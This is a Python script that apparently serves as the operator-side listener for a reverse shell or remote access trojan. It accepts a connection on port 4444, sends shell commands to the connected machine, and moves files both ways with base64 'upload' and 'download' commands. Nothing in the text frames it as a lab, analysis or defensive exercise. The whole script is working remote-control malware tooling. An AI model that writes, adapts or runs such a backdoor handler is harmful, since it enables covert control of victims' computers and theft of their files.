#!/usr/bin/env python3
import socket
import json
import shlex
import base64


class Listener:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((self.ip, self.port))
        self.listener.listen(0)                                      
        print("[+]Waiting for Connection")
        self.connection, address = self.listener.accept()
        print("[+]Connection Established with " + str(address))

    def send(self, command):
        json_data = json.dumps(command)
        self.connection.send(json_data.encode())
        
    def recieve(self):
        json_data = b""
        while True:
            try:
                data = self.connection.recv(1024)
                json_data = json_data + data
                return json.loads(json_data)
            except ValueError:
                continue
    def list_to_string(self, str_list):
        string = ""
        for num in range(1,len(str_list)):
            string = string + str_list[num] + " "
            if str_list[num] == len(str_list):
                string = string + str_list[num]
        return string

    def read_file(self, name):
        with open(name[1], "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, command, content):
        name = self.list_to_string(command)       
        with open(name, "wb") as file:
            file.write(base64.b64decode(content))
        return "[+] Download Successful"

    def process(self,command):
        self.send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.recieve()

    def execute(self):
        while True:
            cmd = input("[+] $: ")
            cmd = shlex.split(cmd)
            try:
                if cmd[0] == "upload":
                    file = self.read_file(cmd).decode()
                    cmd.append(file)
                result = self.process(cmd)
                if cmd[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(cmd, result)
            except KeyboardInterrupt:
                self.connection.close()
                exit()
            except Exception:
                 print("[-] Error something went wrong")
            print(result)



listener = Listener("127.0.0.1", 4444)
listener.execute()
